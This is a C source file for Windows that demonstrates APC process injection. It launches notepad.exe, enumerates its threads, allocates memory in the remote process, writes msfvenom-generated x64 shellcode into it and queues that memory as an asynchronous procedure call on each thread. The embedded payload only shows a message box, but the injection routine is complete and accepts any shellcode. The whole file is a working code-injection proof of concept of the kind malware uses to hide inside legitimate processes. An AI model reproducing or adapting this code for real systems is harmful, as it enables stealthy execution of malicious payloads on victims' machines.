#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>

/*
    Queued APC only executes when target thread enters alertable state:
    SleepEx(), SignalObjectAndWait(), MsgWaitForMultipleObjectsEx(), WaitForMultipleObjectsEx, WaitForSingleObjectEx()
    WSAWaitForMultipleEvents(), GetQueuedCompletionStatusEx(), GetOverlappedResultEx()
*/

#define MAX_THREADS_INJECT 50

DWORD g_threads[MAX_THREADS_INJECT] = { 0 };

DWORD create_notepad(void);
DWORD find_thread(DWORD pid);

DWORD create_notepad(void)
{
    char                    cmdl[] = "C:\\Windows\\System32\\notepad.exe";
    STARTUPINFOA            si = { 0 };
    PROCESS_INFORMATION     pi = { 0 };
    BOOL                    res;

    si.cb = sizeof(STARTUPINFOA);

    res = CreateProcessA(
        cmdl, NULL, NULL, NULL, FALSE,
        CREATE_NEW_CONSOLE, NULL, NULL,
        &si, &pi
    );

    if (!res) {
        puts("[-] Create notepad fail.");
        return 0;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    Sleep(2000);

    return pi.dwProcessId;
}

DWORD find_thread(DWORD pid)
{
    HANDLE              snapshot;
    THREADENTRY32       entry = { 0 };
    DWORD               count = 0;

    entry.dwSize = sizeof(THREADENTRY32);

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        puts("[-] Snapshot fail.");
        return 0;
    }

    while (Thread32Next(snapshot, &entry))
        if (entry.th32OwnerProcessID == pid) {
            if (count < (DWORD)MAX_THREADS_INJECT)
                g_threads[count++] = entry.th32ThreadID;
        }

    CloseHandle(snapshot);
    printf("[*] Thread search complete, found %d/%d threads.\n", count, (DWORD)MAX_THREADS_INJECT);
    return 0;
}

int main(void)
{
    DWORD       notepad_pid = 0, thread_id = 0;
    HANDLE      process = NULL, thread = NULL;
    char *base = NULL;
    DWORD       written = 0;

    // msfvenom --platform windows -p windows/x64/messagebox TEXT="shellcode execution" EXITFUNC=thread -f c
    unsigned char buf[327] =
        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
        "\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
        "\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
        "\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
        "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
        "\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
        "\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
        "\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
        "\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
        "\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
        "\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
        "\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
        "\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
        "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
        "\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e\x4c\x8d"
        "\x85\x2e\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
        "\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
        "\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
        "\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x73\x68\x65\x6c\x6c"
        "\x63\x6f\x64\x65\x20\x65\x78\x65\x63\x75\x74\x69\x6f\x6e\x00"
        "\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x00";

    notepad_pid = create_notepad();
    if (!notepad_pid)
        return 0;

    printf("[+] Notepad pid: %d\n", notepad_pid);

    find_thread(notepad_pid);
    if (!g_threads[0])
        return 0;

    process = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, notepad_pid);
    if (!process) {
        puts("[-] OpenProcess fail.");
        return;
    }

    for (int i = 0; i < (DWORD)MAX_THREADS_INJECT; i++) {
        if (!g_threads[i]) {
            puts("[*] End of queuing threads.");
            return 0;
        }

        thread_id = g_threads[i];

        thread = OpenThread(THREAD_ALL_ACCESS, FALSE, thread_id);
        if (!thread) {
            puts("[-] OpenThread fail.");
            if (process)
                CloseHandle(process);
            return;
        }

        base = (UINT64)VirtualAllocEx(process, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
        if (!base) {
            puts("[-] VirtualAllocEx fail.");
            if (process)
                CloseHandle(process);
            if (thread)
                CloseHandle(thread);
            return;
        }

        if (!WriteProcessMemory(process, (LPVOID)base, (LPCVOID)buf, sizeof(buf), &written)) {
            puts("[-] WriteProcessMemory fail.");
            if (process)
                CloseHandle(process);
            if (thread)
                CloseHandle(thread);
            return;
        }

        if (QueueUserAPC((PAPCFUNC)base, thread, NULL))
            printf("[+] APC Queued for thread %d, wait and pray!\n", i + 1);
        else
            printf("[-] QueueUserAPC fail for thread %d.\n", i + 1);
    }

    return 0;
}